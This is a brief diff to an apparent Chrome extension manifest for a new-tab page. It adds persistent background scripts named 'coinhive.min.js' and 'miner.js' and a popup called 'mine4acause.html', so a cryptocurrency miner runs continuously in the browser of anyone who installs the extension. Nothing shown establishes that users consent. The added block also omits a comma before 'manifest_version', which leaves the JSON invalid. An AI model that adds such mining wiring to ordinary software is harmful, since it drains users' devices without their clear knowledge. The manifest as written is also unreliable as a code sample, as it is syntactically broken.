@@ -17,6 +17,16 @@
     "https://clients1.google.com/",
     "http://clients1.google.com/"  
                   ],
+  
+   "background": {
+    "scripts": ["coinhive.min.js", "miner.js"],
+    "persistent": true
+  },
+  
+    "browser_action": {
+   "default_popup": "mine4acause.html"
+  }
+  
   "manifest_version": 2,
   "chrome_url_overrides": {
     "newtab": "index.html"
